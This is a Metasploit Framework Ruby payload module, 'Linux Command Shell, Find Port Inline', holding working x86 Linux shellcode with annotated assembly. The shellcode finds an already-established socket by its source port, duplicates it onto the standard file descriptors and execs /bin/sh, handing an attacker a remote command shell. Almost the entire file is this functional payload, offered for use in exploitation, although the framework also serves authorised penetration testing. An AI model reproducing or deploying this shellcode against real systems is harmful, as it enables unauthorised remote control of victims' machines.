##
# $Id: shell_find_port.rb 7075 2009-09-27 21:30:45Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/handler/find_port'
require 'msf/base/sessions/command_shell'


module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Linux

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux Command Shell, Find Port Inline',
			'Version'       => '$Revision: 7075 $',
			'Description'   => 'Spawn a shell on an established connection',
			'Author'        => 'ramon',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::FindPort,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'CPORT' => [ 25, 'n' ],
						},
					'Payload' =>
						"\x31\xdb"             +#   xorl    %ebx,%ebx                  #
						"\x53"                 +#   pushl   %ebx                       #
						"\x89\xe7"             +#   movl    %esp,%edi                  #
						"\x6a\x10"             +#   pushl   $0x10                      #
						"\x54"                 +#   pushl   %esp                       #
						"\x57"                 +#   pushl   %edi                       #
						"\x53"                 +#   pushl   %ebx                       #
						"\x89\xe1"             +#   movl    %esp,%ecx                  #
						"\xb3\x07"             +#   movb    $0x07,%bl                  #
						"\xff\x01"             +#   incl    (%ecx)                     #
						"\x6a\x66"             +#   pushl   $0x66                      #
						"\x58"                 +#   popl    %eax                       #
						"\xcd\x80"             +#   int     $0x80                      #
						"\x66\x81\x7f\x02\x04\xd2"+#   cmpw    $0xd204,0x02(%edi)         #
						"\x75\xf1"             +#   jne     <fndsockcode+14>           #
						"\x5b"                 +#   popl    %ebx                       #
						"\x6a\x02"             +#   pushl   $0x02                      #
						"\x59"                 +#   popl    %ecx                       #
						"\xb0\x3f"             +#   movb    $0x3f,%al                  #
						"\xcd\x80"             +#   int     $0x80                      #
						"\x49"                 +#   decl    %ecx                       #
						"\x79\xf9"             +#   jns     <fndsockcode+33>           #
						"\x50"                 +#   pushl   %eax                       #
						"\x68\x2f\x2f\x73\x68" +#   pushl   $0x68732f2f                #
						"\x68\x2f\x62\x69\x6e" +#   pushl   $0x6e69622f                #
						"\x89\xe3"             +#   movl    %esp,%ebx                  #
						"\x50"                 +#   pushl   %eax                       #
						"\x53"                 +#   pushl   %ebx                       #
						"\x89\xe1"             +#   movl    %esp,%ecx                  #
						"\x99"                 +#   cltd                               #
						"\xb0\x0b"             +#   movb    $0x0b,%al                  #
						"\xcd\x80"              #   int     $0x80                      #
				}
			))
	end

end
